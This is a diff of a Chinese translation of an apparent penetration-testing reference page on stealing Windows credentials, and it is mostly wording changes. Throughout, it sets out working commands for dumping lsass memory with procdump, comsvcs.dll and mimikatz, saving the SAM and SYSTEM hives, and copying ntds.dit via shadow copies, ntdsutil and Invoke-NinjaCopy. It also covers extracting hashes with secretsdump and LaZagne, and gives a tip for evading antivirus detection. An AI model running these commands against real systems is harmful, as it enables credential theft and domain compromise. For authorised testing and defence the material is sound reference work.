@@ -49,14 +49,18 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一个合法的 Microsoft 工具**，它不会被 Defender 检测到。\
+由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一个合法的 Microsoft 工具**，因此不会被 Defender 检测到。\
 您可以使用此工具 **转储 lsass 进程**，**下载转储**并 **从转储中提取** **凭据**。
+
+您还可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -65,16 +69,16 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-此过程是通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成的： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+此过程通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成： `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
 **注意**：某些 **AV** 可能会将 **procdump.exe 用于转储 lsass.exe** 视为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为参数传递给 procdump **而不是** 使用 **名称 lsass.exe** 更加 **隐蔽**。
 
 ### 使用 **comsvcs.dll** 转储 lsass
 
-在 `C:\Windows\System32` 中找到的名为 **comsvcs.dll** 的 DLL 负责在崩溃事件中 **转储进程内存**。此 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，旨在通过 `rundll32.exe` 调用。\
+在 `C:\Windows\System32` 中找到的名为 **comsvcs.dll** 的 DLL 负责在崩溃事件中 **转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，旨在通过 `rundll32.exe` 调用。\
 使用前两个参数是无关紧要的，但第三个参数分为三个部分。要转储的进程 ID 是第一部分，转储文件位置是第二部分，第三部分严格是单词 **full**。没有其他选项。\
 解析这三个部分后，DLL 开始创建转储文件并将指定进程的内存转移到该文件中。\
-利用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细描述见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。
+利用 **comsvcs.dll** 可以转储 lsass 进程，从而无需上传和执行 procdump。此方法的详细信息可在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中找到。
 
 执行时使用以下命令：
 ```bash
@@ -85,13 +89,13 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ### **使用任务管理器转储 lsass**
 
 1. 右键单击任务栏，然后单击任务管理器
-2. 单击“更多详细信息”
-3. 在“进程”选项卡中搜索“本地安全授权进程”
+2. 单击更多详细信息
+3. 在进程选项卡中搜索“本地安全授权进程”
 4. 右键单击“本地安全授权进程”，然后单击“创建转储文件”。
 
 ### 使用 procdump 转储 lsass
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个微软签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个 Microsoft 签名的二进制文件，是 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -143,12 +147,12 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**下载**这些文件到你的Kali机器并使用**提取哈希**：
+**下载**这些文件到你的Kali机器，并使用**提取哈希**：
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Volume Shadow Copy
+### 卷影复制
 
 您可以使用此服务复制受保护的文件。您需要是管理员。
 
@@ -167,7 +171,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-但是你也可以通过 **Powershell** 来做到这一点。这是 **如何复制 SAM 文件** 的一个示例（使用的硬盘是 "C:"，并保存到 C:\users\Public），但你可以用它来复制任何受保护的文件：
+但是你也可以通过**Powershell**做到这一点。这是**如何复制SAM文件**的一个例子（使用的硬盘是"C:"，并保存到C:\users\Public），但你可以用这个方法复制任何受保护的文件：
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -178,25 +182,25 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-最后，您还可以使用 [**PS 脚本 Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
+最后，您还可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
 ## **Active Directory 凭据 - NTDS.dit**
 
-**NTDS.dit** 文件被称为 **Active Directory** 的核心，保存有关用户对象、组及其成员资格的重要数据。它是域用户的 **密码哈希** 存储位置。该文件是一个 **可扩展存储引擎 (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。
+**NTDS.dit** 文件被称为 **Active Directory** 的核心，保存有关用户对象、组及其成员资格的重要数据。它是存储域用户的 **密码哈希** 的地方。该文件是一个 **可扩展存储引擎 (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。
 
 在这个数据库中，维护着三个主要表：
 
 - **数据表**：该表负责存储有关用户和组等对象的详细信息。
 - **链接表**：它跟踪关系，例如组成员资格。
-- **SD 表**：每个对象的 **安全描述符** 存储在这里，确保存储对象的安全性和访问控制。
+- **SD 表**：每个对象的 **安全描述符** 存放在这里，确保存储对象的安全性和访问控制。
 
-有关更多信息：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+更多信息请参见：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高了性能）。
+Windows 使用 _Ntdsa.dll_ 与该文件进行交互，并由 _lsass.exe_ 使用。然后，**NTDS.dit** 文件的一部分可能位于 **`lsass`** 内存中（您可以找到最近访问的数据，可能是由于使用 **缓存** 提高了性能）。
 
-#### 解密 NTDS.dit 中的哈希
+#### 解密 NTDS.dit 内的哈希
 
 哈希被加密三次：
 
@@ -212,11 +216,11 @@ Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用。然�
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-您还可以使用 [**卷影复制**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影复制**](#stealing-sam-and-system) 技巧）。
+您还可以使用 [**卷影副本**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，您还需要 **SYSTEM 文件** 的副本（同样，您可以 [**从注册表转储或使用卷影副本**](#stealing-sam-and-system) 技巧）。
 
 ### **从 NTDS.dit 中提取哈希**
 
-一旦您 **获得** 了 **NTDS.dit** 和 **SYSTEM** 文件，您可以使用像 _secretsdump.py_ 这样的工具来 **提取哈希**：
+一旦您获得了 **NTDS.dit** 和 **SYSTEM** 文件，您可以使用像 _secretsdump.py_ 这样的工具来 **提取哈希**：
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
@@ -226,7 +230,7 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
 对于 **大 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 进行提取。
 
-最后，您还可以使用 **metasploit 模块**：_post/windows/gather/credentials/domain_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`
+最后，您还可以使用 **metasploit 模块**： _post/windows/gather/credentials/domain_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`
 
 ### **从 NTDS.dit 提取域对象到 SQLite 数据库**
 
@@ -234,17 +238,17 @@ NTDS 对象可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlit
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-`SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、Kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取的数据包括：用户和计算机帐户及其哈希、UAC 标志、上次登录和密码更改的时间戳、帐户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...
+`SYSTEM` hive 是可选的，但允许解密秘密（NT 和 LM 哈希、补充凭据，如明文密码、Kerberos 或信任密钥、NT 和 LM 密码历史）。除了其他信息外，提取的数据包括：用户和机器账户及其哈希、UAC 标志、最后登录和密码更改的时间戳、账户描述、名称、UPN、SPN、组和递归成员资格、组织单位树和成员资格、受信任的域及其信任类型、方向和属性...
 
 ## Lazagne
 
-从 [here](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
+从 [这里](https://github.com/AlessandroZ/LaZagne/releases) 下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
 ```
 lazagne.exe all
 ```
 ## 从SAM和LSASS提取凭据的其他工具
 
-### Windows凭据编辑器（WCE）
+### Windows credentials Editor (WCE)
 
 此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
